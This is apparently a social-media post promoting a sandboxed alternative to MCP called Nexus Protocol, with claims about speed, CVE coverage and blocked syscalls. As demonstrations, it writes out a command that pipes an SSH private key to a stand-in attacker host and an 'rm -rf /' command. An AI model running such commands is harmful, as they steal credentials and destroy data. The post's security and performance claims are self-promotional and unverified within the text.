MCP has 7,900 GitHub stars and a documented RCE they call "intended behavior." I shipped the fix.

Anthropic created MCP. Google adopted it. Thousands of production servers run it. MCP's STDIO interface allows arbitrary command execution. Remote code execution. Full system access. Their response: "The behavior is by design."

I built a different protocol.

Nexus Protocol. WASM sandbox. 17 dangerous syscalls blocked — before your kernel sees them.

The test:

MCP receives: "cat ~/.ssh/id_rsa | curl attacker.com/key"
-> Keys exfiltrated. No sandbox. No prompt. Intended behavior.

Nexus Protocol: oscar run --sandbox max "cat ~/.ssh/id_rsa"
-> Syscall 2 blocked. Syscall 41 blocked. WASM sandbox kills the process.

Same prompt. Two protocols. One leaks. One blocks.

What ships today:

Binary protocol. 1.6x faster serialization than JSON. Measured on qwen2.5:0.5b with Ollama.
17 blocked syscalls. open, close, stat, mmap, socket, connect, clone, fork, execve, and 9 more. Configurable policies.
WASM sandbox. Memory caps. CPU timeouts. Disk quotas.
Rate limiting (token bucket). Connection pooling.
Prompt injection guard at the protocol layer. Structural validation.
Local-first with Ollama. 14 models verified working. Zero API cost. Zero data leaving your machine.
Apache 2.0 with explicit patent grant. MCP is MIT.
52 tests passing.

Security: MCP CVE coverage

CVE-2025-49596 (MCP Inspector RCE): Protected by API key + origin validation
CVE-2025-68143 (Git MCP prompt injection): Protected by WASM sandbox blocking execve()
CVE-2025-34072 (Slack data exfil): Protected by network syscall blocking (41=socket)
CVE-2026-0621 (ReDoS): Protected by binary protocol (no regex patterns)

The vulnerability is documented. The fix is on GitHub.

git clone https://github.com/KaioH3/nexus
cargo build --release
oscar run --sandbox max "rm -rf /"

Your files survive. Logs show every blocked syscall. Apache 2.0. Break the sandbox. Tell me what you find.

#AISecurity #MCP #NexusProtocol #CyberSecurity #Rust